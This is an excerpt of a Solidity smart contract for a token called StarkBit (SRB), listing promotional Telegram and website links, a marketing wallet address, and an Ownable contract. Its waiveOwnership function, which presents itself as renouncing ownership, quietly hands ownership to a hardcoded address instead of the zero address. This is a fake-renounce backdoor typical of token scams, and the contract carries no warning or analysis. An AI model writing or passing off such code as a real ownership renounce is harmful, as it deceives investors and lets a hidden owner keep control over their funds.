...
Telegram : https://t.me/starkbitofficial
Website : https://starkbit.io
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x586A7F20182957c8080afc153295e418b3a166d4);
    }
...
contract TheStarkbit is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "StarkBit";
    string private _symbol = "SRB";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x77DC30f32DB058A72BDcFdC0faB694449CF79B37);
